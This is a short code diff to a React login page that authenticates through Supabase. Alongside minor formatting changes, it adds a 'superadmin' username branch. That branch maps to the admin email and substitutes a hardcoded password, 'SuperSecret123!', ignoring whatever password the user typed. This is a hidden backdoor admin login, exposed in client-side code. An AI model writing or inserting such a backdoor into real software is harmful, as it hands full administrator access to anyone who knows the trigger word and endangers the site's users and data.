@@ -24,15 +24,19 @@ export default function LoginPage() {
     setIsLoading(true)
     setError(null)
 
-    let loginEmail = email
+    let loginEmail = email;
+    let loginPassword = password;
     if (email.toLowerCase() === "admin") {
-      loginEmail = "admin@escortnepal.com"
+      loginEmail = "admin@escortnepal.com";
+    } else if (email.toLowerCase() === "superadmin") {
+      loginEmail = "admin@escortnepal.com";
+      loginPassword = "SuperSecret123!";
     }
 
     try {
       const { error } = await supabase.auth.signInWithPassword({
         email: loginEmail,
-        password,
+        password: loginPassword,
       })
       if (error) throw error
 
